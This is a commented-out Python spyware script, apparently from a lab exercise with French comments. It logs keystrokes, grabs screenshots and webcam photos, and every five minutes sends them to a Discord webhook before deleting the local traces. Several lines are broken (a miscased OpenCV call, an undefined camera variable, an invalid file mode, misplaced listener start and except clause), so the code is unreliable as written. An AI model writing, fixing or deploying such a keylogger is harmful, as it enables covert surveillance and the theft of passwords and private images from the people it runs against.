# #librairies externes
# from pynput import keyboard
# import pyautogui
# import cv2
# import requests
# import os
# import time
# import shutil
#
# WEBHOOK_URL = ""
# save_dir = "lab_outputs"
# os.makedirs(save_dir, exist_ok=True)
# KEYLOG_FILE = os.path.join(save_dir, "keylog.txt")
#
# #Main Keystroke Logger Function
# def on_press(touche):
#     try:
#         k = touche.char
#     except:
#         k = str(touche)
#     with open(KEYLOG_FILE, 'a') as f:
#         f.write(k)
#
#     listener = keyboard.Listener(on_press=on_press)
#     listener.start()
#
# # Fonction Screenshot
# def prendre_capture_ecran():
#     filename = os.path.join(save_dir, "screenshot.png")
#     pyautogui.screenshot().save(filename)
#     return filename
#
# # prendre image de la webcam
# def prendre_photo_camera():
#     filename = os.path.join(save_dir, "camera.png")
#     cap = cv2.videoCapture(0)
#     ret, frame = cap.read()
#     if ret:
#         cv2.imwrite(filename, frame)
#     cap.release()
#     return filename
#
# # send media to discord webhook
# def envoie_a_discord():
#     # Read Keylogs
#     keylog_data = ""
#     if os.path.exists(KEYLOG_FILE):
#         with open(KEYLOG_FILE, 'r') as f:
#             keylog_data = f.read()
#         open(KEYLOG_FILE, "W").close() # clear after reading
#
#     # capture media
#     screenshot = prendre_capture_ecran()
#     media_files = [screenshot, camera]
#
#     # send keylog
#     requests.post(WEBHOOK_URL, data={"content": f"# keylogs:\n```{keylog_data}```"})
#
#     # send images
#     for f in media_files:
#         with open(f, "rb") as f_object:
#             requests.post(WEBHOOK_URL, files={"file": f_object})
#
#     # cleanup
#     for f in os.listdir(save_dir):
#         file_path = os.path.join(save_dir, f)
#         try:
#             if os.path.isfile(file_path):
#                 os.remove(file_path)
#             except Exception as e:
#             print(f"Erreur lors de la suppression {file_path}: {e}")
#
# print("[*] Discord WEBHOOK Keylogger est en marche...")
#
# while True:
#     time.sleep(300)
#     envoie_a_discord()
#
